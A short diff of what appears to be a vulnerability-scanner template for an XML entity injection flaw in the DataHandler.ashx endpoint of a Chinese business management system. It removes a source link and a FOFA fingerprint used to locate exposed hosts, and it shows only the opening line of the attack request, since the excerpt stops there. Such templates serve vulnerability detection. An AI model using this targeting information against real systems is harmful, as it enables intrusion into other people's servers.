@@ -3,12 +3,8 @@ info:
   name: 友加畅捷管理系统 DataHandler.ashx 存在XML实体注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hu20epzcwzq10fh2'
+  description: ''
   tags: other,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hu20epzcwzq10fh2
-    fofa: icon_hash="2049187099"
 http:
 - raw:
   - 'POST /Report/DataHandler.ashx?Type=SaveData HTTP/1.1
